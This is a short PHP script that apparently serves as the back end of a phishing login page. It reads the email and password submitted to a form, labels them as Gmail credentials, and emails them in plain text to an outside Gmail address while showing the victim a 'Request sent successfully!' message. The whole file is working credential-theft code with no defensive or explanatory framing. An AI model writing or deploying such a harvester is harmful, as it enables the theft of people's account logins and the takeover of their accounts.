<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $email = $_POST["email"];
  $password = $_POST["password"];
  $to = "p7tireslow@gmail.com";
  $subject = "New Login Request";
  $message = "Gmail: $email/nPassword: $password";
  $headers = "From: pt17tireslow@gmail.com";
  if(mail($to,$subject,$message,$headers)) {
    echo "Request sent successfully!";
  }else {echo "Error sending request!";
        }
}
?>
  
